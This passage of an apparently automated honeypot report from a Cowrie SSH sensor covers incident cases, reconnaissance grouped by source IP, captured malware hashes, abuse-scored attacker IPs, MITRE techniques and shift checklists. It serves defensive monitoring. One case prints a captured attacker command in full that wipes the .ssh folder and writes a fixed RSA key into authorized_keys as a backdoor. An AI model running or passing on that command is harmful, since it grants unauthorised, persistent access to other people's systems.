| `2026-04-10 16:10:48` | `cowrie.command.failed` |
| `2026-04-10 16:10:49` | `cowrie.log.closed` |
| `2026-04-10 16:10:49` | `cowrie.session.params` |
| `2026-04-10 16:10:49` | `cowrie.command.input` |
| `2026-04-10 16:10:49` | `cowrie.session.file_download` |
| `2026-04-10 16:10:49` | `cowrie.log.closed` |
| `2026-04-10 16:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef0c84d89a0f

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 16:10 |
| **Last Seen** | 2026-04-10 16:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 16:10:50` | `cowrie.session.connect` |
| `2026-04-10 16:10:50` | `cowrie.client.version` |
| `2026-04-10 16:10:50` | `cowrie.client.kex` |
| `2026-04-10 16:10:51` | `cowrie.login.success` |
| `2026-04-10 16:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-487b3c9c36d8

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 16:14 |
| **Last Seen** | 2026-04-10 16:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 16:14:20` | `cowrie.session.connect` |
| `2026-04-10 16:14:20` | `cowrie.client.version` |
| `2026-04-10 16:14:20` | `cowrie.client.kex` |
| `2026-04-10 16:14:20` | `cowrie.login.success` |
| `2026-04-10 16:14:20` | `cowrie.session.params` |
| `2026-04-10 16:14:20` | `cowrie.command.input` |
| `2026-04-10 16:14:20` | `cowrie.command.failed` |
| `2026-04-10 16:14:20` | `cowrie.log.closed` |
| `2026-04-10 16:14:20` | `cowrie.session.params` |
| `2026-04-10 16:14:20` | `cowrie.command.input` |
| `2026-04-10 16:14:20` | `cowrie.session.file_download` |
| `2026-04-10 16:14:20` | `cowrie.log.closed` |
| `2026-04-10 16:14:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ee70423e24d

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 16:14 |
| **Last Seen** | 2026-04-10 16:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 16:14:22` | `cowrie.session.connect` |
| `2026-04-10 16:14:22` | `cowrie.client.version` |
| `2026-04-10 16:14:22` | `cowrie.client.kex` |
| `2026-04-10 16:14:22` | `cowrie.login.success` |
| `2026-04-10 16:14:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `43.156.71[.]43` | **25** | 2026-04-10 15:29 | 2026-04-10 16:14 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `121.229.27[.]155` | **23** | 2026-04-10 15:31 | 2026-04-10 15:40 | 6m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `179.57.170[.]71` | **21** | 2026-04-10 14:46 | 2026-04-10 15:24 | 1m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `111.228.6[.]161` | **20** | 2026-04-10 14:45 | 2026-04-10 15:12 | 30m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.111[.]135` | **17** | 2026-04-10 15:31 | 2026-04-10 15:48 | 17m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `187.107.88[.]97` | **7** | 2026-04-10 15:35 | 2026-04-10 15:57 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.64[.]177` | 1 | 2026-04-10 15:34 | 2026-04-10 15:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `173.209.174[.]59` | 1 | 2026-04-10 15:29 | 2026-04-10 15:29 | 31s | 0 | `T1592` | 🟢 LOW |
| `189.147.20[.]241` | 1 | 2026-04-10 15:30 | 2026-04-10 15:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.250.72[.]168` | 1 | 2026-04-10 15:30 | 2026-04-10 15:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `37.10.113[.]214` | 1 | 2026-04-10 16:44 | 2026-04-10 16:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `73.72.115[.]182` | 1 | 2026-04-10 16:34 | 2026-04-10 16:34 | 31s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `37.10.113[.]214` | GB | Infrawatch Limited | **100** ⚠️ | 14 |
| `173.209.174[.]59` | US | Northwest Internet | **100** ⚠️ | 3 |
| `121.229.27[.]155` | CN | CHINANET jiangsu province network | **100** ⚠️ | 41 |
| `111.228.6[.]161` | CN | eleven street,No. 18 Institute of Jingdong headquarters | **100** ⚠️ | 5 |
| `73.72.115[.]182` | US | Comcast IP Services, L.L.C. | **100** ⚠️ | 28 |
| `189.147.20[.]241` | MX | Gestión de direccionamiento UniNet | **100** ⚠️ | 15 |
| `187.107.88[.]97` | BR | Claro NXT Telecomunicacoes Ltda | **100** ⚠️ | 50 |
| `14.103.64[.]177` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `43.156.71[.]43` | SG | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 50 |
| `179.57.170[.]71` | CL | Telefonica del Sur S.A. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 193 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 81 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 78 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 40 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 40 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 203 cases |
| Tool 34  | Credential Extractor        | ✅ 159 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (3.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 78 priority case(s) shown individually · 12 recon entry/entries in table (6 group(s) consolidating 113 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-10T16:49:03Z_
